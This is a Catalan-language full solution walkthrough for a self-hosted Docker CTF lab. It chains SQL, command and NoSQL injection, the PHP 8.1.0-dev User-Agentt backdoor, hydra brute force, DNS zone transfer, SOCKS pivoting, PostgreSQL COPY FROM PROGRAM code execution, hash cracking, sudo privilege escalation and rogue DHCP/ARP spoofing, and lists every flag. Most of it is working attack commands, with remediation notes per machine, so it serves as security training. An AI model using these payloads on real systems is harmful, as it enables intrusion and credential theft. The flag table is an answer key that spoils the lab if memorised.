# OOPS-CTF — SOLUCIONARI (walkthrough complet)

> 🔒 **Spoilers totals.** Aquest document resol el laboratori de dalt a baix.
> Fes servir `GUIA.md` (pistes) si vols intentar-ho tu abans.
> Adreces: DMZ `10.10.10.0/24`, interna `10.10.20.0/24`.

Índex: [0. Setup](#0) · [1. Recon](#1) · [2. OOPS_1](#2) · [3. OOPS_3](#3) ·
[4. OOPS_4 + pivot](#4) · [5. OOPS_2](#5) · [6. OOPS_5](#6) · [7. L2 macvlan](#7) ·
[8. Taula de flags](#8)

---

<a name="0"></a>
## 0. Preparació

```bash
cd oops-ctf
bash setup-networks.sh
make up                       # aixeca oops1..5

# Consola d'atac a la DMZ
docker run -it --rm --network oops_dmz --name kali kalilinux/kali-rolling bash
apt update && apt install -y nmap dnsutils netexec hydra hashcat john gobuster \
    proxychains4 openssh-client postgresql-client curl jq
```

---

<a name="1"></a>
## 1. Reconeixement de la DMZ

```bash
nmap -sn 10.10.10.0/24
# → 10.10.10.11 (oops1), .13 (oops3), .14 (oops4)

nmap -sCV -p- 10.10.10.11 10.10.10.13 10.10.10.14
# oops1  : 22 ssh, 80 http (nginx, PHP)
# oops3  : 22 ssh, 8080 http, 27017 mongodb
# oops4  : 22 ssh, 53 dns
```

---

<a name="2"></a>
## 2. OOPS_1 — Web → user → root

### 2.1 Accés inicial (qualsevol dels tres camins)

**Camí A — SQL injection al login**
```bash
curl -s http://10.10.10.11/login.php \
  --data "username=admin' -- -&password=x" | grep -i benvingut
# Autentica com admin: el "-- -" comenta la comprovació de contrasenya.
```

**Camí B — Command injection a l'eina de ping**
```bash
curl -s "http://10.10.10.11/tools.php?host=127.0.0.1;id"
# uid=33(www-data) -> RCE com www-data
curl -s "http://10.10.10.11/tools.php?host=127.0.0.1;cat+/etc/passwd"
```

**Camí C — Backdoor estil PHP 8.1.0-dev**
```bash
curl -s http://10.10.10.11/ -H "User-Agentt: zerodiumsystem('id')"
# executa ordres via la capçalera User-Agentt
```

### 2.2 Contrasenyes caducades (patró + hydra) — objectiu paral·lel

La taula `users` (visible via SQLi: `admin' UNION SELECT 1,username,password FROM users -- -`)
segueix el patró `<Estació><Any>!`.
```bash
for s in Spring Summer Autumn Winter; do for y in $(seq 2020 2026); do
  echo "${s}${y}!"; done; done > pat.txt
printf 'admin\njsmith\nmgarcia\nrlopez\nsvc_web\n' > users.txt
hydra -L users.txt -P pat.txt 10.10.10.11 \
  http-post-form "/login.php:username=^USER^&password=^PASS^:Credencials incorrectes"
```
> El compte SSH `webadmin` té contrasenya FORTA a posta: no és el camí.

### 2.3 L'enigma "pattern matching" → secret d'`oopsuser`

```bash
# El .php de /internal/ conté nombres ASCII decimals. Baixa'l i descodifica:
curl -s http://10.10.10.11/internal/patternmatch.php -o pm.php   # o via RCE: cat el fitxer
grep -oE '[0-9]+( [0-9]+)+' pm.php | head -1 > codes.txt
python3 -c "print(''.join(chr(int(x)) for x in open('codes.txt').read().split()))"
# → "...secret matches this literal pattern: Cr4ckM3_L4b#2024 -- use it with: su oopsuser"
```

Amb RCE (camí B/C) o per SSH si reutilitzes:
```bash
su oopsuser            # contrasenya: Cr4ckM3_L4b#2024
cat ~/user_flag.txt    # FLAG{oops1_web_user_foothold}
```

### 2.4 Privesc `oopsuser` → root (sudo + GTFOBins)

```bash
sudo -l                                # (root) NOPASSWD: /usr/bin/find
sudo find . -exec /bin/sh \; -quit     # shell de root
cat /root/flag.txt                     # FLAG{oops1_root_pattern_matching_solved}
```

**Remediació:** consultes parametritzades (prepared statements), `escapeshellarg`,
actualitzar PHP, no guardar contrasenyes en text pla, treure la regla `sudo find`.

---

<a name="3"></a>
## 3. OOPS_3 — Web 8080 + MongoDB → user → root

### 3.1 Descobriment amb gobuster

```bash
gobuster dir -u http://10.10.10.13:8080 -w /usr/share/wordlists/dirb/common.txt
# → /backup (200)   /login (200)   /api/debug (200)
```

### 3.2 MongoDB sense auth + NoSQL injection

```bash
# Volcat directe via l'endpoint de debug (o connectant-te al 27017 sense auth):
curl -s http://10.10.10.13:8080/api/debug | jq .
# usuaris:  admin/M0ng0Adm1n!   editor/letmein2024
# secure_docs: ciphertext AES ; system_secrets: hash $5$...

# Bypass del login amb operador de Mongo:
curl -s http://10.10.10.13:8080/login -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":{"$ne":null}}'
```

### 3.3 Desxifrar les dades (clau filtrada a /backup)

```bash
curl -s http://10.10.10.13:8080/backup     # DATA_ENC_KEY=Sup3rMongoKey_2024
BLOB=$(curl -s http://10.10.10.13:8080/api/debug | jq -r '.secure_docs[0].ciphertext')
echo "$BLOB" | openssl enc -d -aes-256-cbc -pbkdf2 -a -pass pass:Sup3rMongoKey_2024
# → Client VIP: Nord Corp ... FLAG{oops3_decrypted_secure_doc}
```

### 3.4 Foothold per reutilització de credencials

L'usuari de sistema `appuser` reutilitza la contrasenya de `editor` (Mongo):
```bash
ssh appuser@10.10.10.13        # letmein2024
cat ~/user_flag.txt            # FLAG{oops3_user_via_mongo_nosqli}
```

### 3.5 Privesc: trencar el SHA-256 amb salt

```bash
# Hash de system_secrets:  $5$R00tS4lt$Lzq8t3vvtPkOABDf4CDvJU/BgzbMUE.FnDLekEXAXT/
echo '$5$R00tS4lt$Lzq8t3vvtPkOABDf4CDvJU/BgzbMUE.FnDLekEXAXT/' > root.hash
hashcat -m 7400 root.hash /usr/share/wordlists/rockyou.txt      # o: john --format=sha256crypt
# → dragon
su root        # contrasenya: dragon
cat /root/flag.txt      # FLAG{oops3_root_cracked_sha256crypt}
```

**Remediació:** activar autenticació a MongoDB i bind local; validar tipus a les
consultes (evitar operadors NoSQL de l'usuari); no exposar `/backup` ni `/api/debug`;
no reutilitzar contrasenyes; hashos amb cost alt (bcrypt/argon2).

---

<a name="4"></a>
## 4. OOPS_4 — DNS (AXFR) + foothold + PIVOT

### 4.1 Transferència de zona → descobrir la xarxa interna

```bash
dig axfr oops.lab @10.10.10.14
# oops2.oops.lab  10.10.20.12
# oops5.oops.lab  10.10.20.15   <- crown jewel
# TXT: "oops5 es la crown jewel; entra-hi via pivot per oops4"
```

### 4.2 Foothold SSH (contrasenya feble)

```bash
echo -e "spring\nsummer\nautumn\nwinter\npassword\n123456" > small.txt
hydra -l netadmin -P small.txt ssh://10.10.10.14 -t 4      # → autumn
ssh netadmin@10.10.10.14
cat ~/user_flag.txt                 # FLAG{oops4_pivot_gateway}
cat /opt/net/inventory.txt          # oops5 admin ssh pass: L4t3r4l_M0v3_2024
```

### 4.3 Muntar el pivot cap a `oops_internal`

OOPS_4 està a les dues xarxes; l'usem com a passarel·la SOCKS:
```bash
# des de Kali:
ssh -D 1080 netadmin@10.10.10.14        # túnel SOCKS al 1080
# configura proxychains: 'socks5 127.0.0.1 1080' a /etc/proxychains4.conf
```
Ara `proxychains <eina> 10.10.20.x` arriba a la xarxa interna.

---

<a name="5"></a>
## 5. OOPS_2 — PostgreSQL (via pivot) → user → root

### 5.1 Accés a PostgreSQL a través del pivot

```bash
proxychains psql "host=10.10.20.12 port=5432 user=intranet password=intranet dbname=intranet"
```

### 5.2 RCE amb COPY … FROM PROGRAM (CVE-2019-9193)

```sql
CREATE TABLE IF NOT EXISTS rce(o text);
COPY rce FROM PROGRAM 'id';                 SELECT * FROM rce;   -- postgres
COPY rce FROM PROGRAM 'cat /opt/secure/aes.key';  SELECT * FROM rce;  -- clau AES
-- → S3cr3t_AES_K3y_do_not_share
```

### 5.3 Desxifrar dades i treure la clau SSH

```sql
SELECT ciphertext FROM secure_data;         -- blob AES
SELECT private_key FROM ssh_keys;            -- clau privada de dbuser
```
```bash
echo '<blob>' | openssl enc -d -aes-256-cbc -pbkdf2 -a -pass pass:S3cr3t_AES_K3y_do_not_share
# → ...FLAG{oops2_decrypted_customer_data}

# Desar la clau SSH i entrar (a través del pivot):
printf -- '<private_key>\n' > dbuser.key && chmod 600 dbuser.key
proxychains ssh -i dbuser.key dbuser@10.10.20.12
cat ~/user_flag.txt                          # FLAG{oops2_user_foothold_via_pg}
```

Trencar els hashos amb salt (format `sha256(salt || pass)`):
```bash
python3 - <<'PY'
import hashlib
creds={'alice':'S4lt_alice','bob':'S4lt_bob','carol':'S4lt_carol','dave':'S4lt_dave'}
hashes={'alice':'51a9d004583ca786def2266e761c89f64a23627ffc922dd69ca3cc4c8eebef10',
        'bob':'f86a9bc4f6e233fb9cb03cce52d9086446bad8ae1a0a87f95bd2ea8fc8e779b0',
        'carol':'c317b3d4b1a33df42480d5139278e4c36d51199fed503a9d47de8d70827e2e2a',
        'dave':'a43982019e103baf9df8b2e08c053659651bfb0366a0757520b8b2fc66a90b90'}
wl=['sunshine','liverpool','password1','monkey123','dragon','letmein']
for u,s in creds.items():
    for w in wl:
        if hashlib.sha256((s+w).encode()).hexdigest()==hashes[u]:
            print(u,'->',w)
PY
# alice->sunshine  bob->liverpool  carol->password1  dave->monkey123
```

### 5.4 Privesc via sudo (fitxer "sourced" escrivible)

```bash
sudo -l                                      # (root) NOPASSWD: /opt/backup.sh
echo 'chmod +s /bin/bash' > ~/backup.conf    # backup.sh fa `source ~/backup.conf`
sudo /opt/backup.sh
/bin/bash -p                                 # euid=0
cat /root/flag.txt                           # FLAG{oops2_root_via_sudo_backup}
```

**Remediació:** treure `pg_execute_server_program`/superuser al rol de l'app;
no guardar claus privades ni secrets a la BD; `sudo` sense `source` de fitxers
escrivibles per l'usuari; xifratge amb gestió de claus adequada.

---

<a name="6"></a>
## 6. OOPS_5 — Crown Jewel (moviment lateral)

Només és a `oops_internal`; hi arribem pel pivot amb la credencial reutilitzada.
```bash
proxychains ssh siteadmin@10.10.20.15        # L4t3r4l_M0v3_2024
cat ~/user_flag.txt                          # FLAG{oops5_lateral_movement_success}
sudo -l                                       # (ALL) NOPASSWD: ALL
sudo cat /root/flag.txt                       # FLAG{oops5_CROWN_JEWEL_full_compromise}
```
**Compromís total assolit.** 🏁

**Remediació:** no reutilitzar credencials entre hosts; segmentació + MFA per
comptes administratius; mínim privilegi a `sudo`; monitoratge de moviment lateral.

---

<a name="7"></a>
## 7. Segment L2 (macvlan) — DHCP/DNS/ARP

Detall a `macvlan/README-macvlan.md`. Resum resolt:

```bash
cd macvlan && bash setup-macvlan.sh && bash run-lab.sh && bash spawn-victim.sh
docker exec -it attacker bash
```
Dins l'atacant (10.10.30.10):
```bash
# O1 AXFR
dig axfr oops.lab @10.10.30.14

# O2 observar el DORA
tcpdump -i eth0 -n port 67 or port 68 &
docker logs oops4        # DHCPDISCOVER/OFFER/REQUEST/ACK

# O3 DHCP starvation (esgotar el pool .100-.200)
# amb dsniff/ettercap o script de dhclient amb MACs falses; vigila docker logs oops4

# O4 rogue DHCP + presa de DNS (respondre abans que oops4)
cat > /tmp/rogue.conf <<'EOF'
interface=eth0
dhcp-range=10.10.30.210,10.10.30.240,2m
dhcp-option=6,10.10.30.10       # DNS = jo
address=/oops.lab/10.10.30.10   # forjo la zona sencera
EOF
dnsmasq -d --conf-file=/tmp/rogue.conf

# O5 ARP + DNS spoofing (MITM sense tocar el DHCP)
ettercap -T -i eth0 -M arp /10.10.30.100// /10.10.30.14//
```

**Nota honesta:** amb IPAM normal de macvlan la víctima ja té una IP de Docker;
l'`entrypoint` força un DORA real per fer-lo observable/atacable. Per L2 100% pur,
el més fidel segueix sent VMs en *Internal Network* sense DHCP propi.

---

<a name="8"></a>
## 8. Taula de flags

| # | Màquina | Flag usuari | Flag root/extra |
|---|---------|-------------|-----------------|
| 1 | OOPS_1  | `FLAG{oops1_web_user_foothold}` | `FLAG{oops1_root_pattern_matching_solved}` |
| 2 | OOPS_2  | `FLAG{oops2_user_foothold_via_pg}` | `FLAG{oops2_decrypted_customer_data}` · `FLAG{oops2_root_via_sudo_backup}` |
| 3 | OOPS_3  | `FLAG{oops3_user_via_mongo_nosqli}` | `FLAG{oops3_decrypted_secure_doc}` · `FLAG{oops3_root_cracked_sha256crypt}` |
| 4 | OOPS_4  | `FLAG{oops4_pivot_gateway}` | — |
| 5 | OOPS_5  | `FLAG{oops5_lateral_movement_success}` | `FLAG{oops5_CROWN_JEWEL_full_compromise}` |

### Cadena curta (TL;DR)
Recon → OOPS_1 (SQLi/CmdInj/backdoor → enigma ASCII → `su oopsuser` → `sudo find` → root)
→ OOPS_3 (gobuster + NoSQLi + AES + sha256crypt) → OOPS_4 (AXFR + hydra → pivot SOCKS)
→ OOPS_2 (PG `COPY FROM PROGRAM` → clau SSH a la BD → sudo backup) → OOPS_5
(reutilització de credencials → `sudo ALL`) → **domini compromès**.
